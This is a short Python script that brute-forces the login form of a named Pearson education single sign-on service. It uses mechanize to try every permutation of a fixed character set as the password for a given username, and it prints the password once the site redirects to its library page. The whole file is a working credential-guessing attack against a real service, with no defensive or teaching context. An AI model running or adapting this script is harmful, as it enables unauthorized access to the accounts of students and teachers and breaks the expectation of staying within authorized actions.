#!/usr/bin/python
import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

combos=itertools.permutations("i34U^hP-",8)
r =br.open("http://idp.activeteachonline.com/sso/idp/www/module.php/core/loginuserpass.php?AuthState=_616d82a129aabc2d1855f6778326c25d8d91c571ba%3Ahttps%3A%2F%2Fidp.activeteachonline.com%2Fsso%2Fidp%2Fwww%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwww.pearsonactivelearn.com%26cookieTime%3D1521731634%26RelayState%3D")
for x in combos:
	new_form = '''
	<form action="?" method="post" name="f">
        <fieldset class="group">
            <h2>
                Log in
                <div class="faq-link">
                    <a target="_blank" href="http://www.pearsonschoolsandfecolleges.co.uk/DigitalSupport/Secondary/ALDS_HelpArea/07-Technical-help-and-FAQs/ALDS-SSO-FAQs.aspx">
                            <p>Need help logging in?</p>
                    </a>
                </div>
            </h2>
            <div id="login-form-wrap">
                <div class="login-user form-group">
                    <span class="input-group-addon"><i class="fa fa-user"></i></span>
                    <input class="required loginInput" name="username" id="Username" type="text" placeholder="Username or Email" value="" autocomplete="off" autofocus="" value="">
                </div>
                <div class="login-pass form-group">
                    <span class="input-group-addon"><i class="fa fa-lock"></i></span>
                    <input class="required loginInput" name="password" id="password" type="password" placeholder="Password" value="" autocomplete="off">
                </div>
<input type="hidden" name="AuthState" value="_616d82a129aabc2d1855f6778326c25d8d91c571ba:https://idp.activeteachonline.com/sso/idp/www/saml2/idp/SSOService.php?spentityid=https%3A%2F%2Fwww.pearsonactivelearn.com&amp;cookieTime=1521731634&amp;RelayState=" />
<div class="login-pass form-group forgot-password"><a href="https://www.pearsonactivelearn.com/recover" rel="external" title="Request new password (opens in a new window)" tabindex="9">Forgot your password?</a></div>                <input type="submit" id="regularsubmit" class="button login-button" value="Log in">

            </div>
        </fieldset>
	</form>
	'''
	#all you have to take care is they have the same name for input fields and submit button
	r.set_data(new_form)
	br.set_response(r)
	br.select_form( nr = 0 )
	br.form['username'] = "user name"
	br.form['password'] = ''.join(x)
	print "Checking ",br.form['password']
	response=br.submit()
	if response.geturl()=="https://www.pearsonactivelearn.com/app/library":
		#url to which the page is redirected after login
		print "Correct password is ",''.join(x)
		break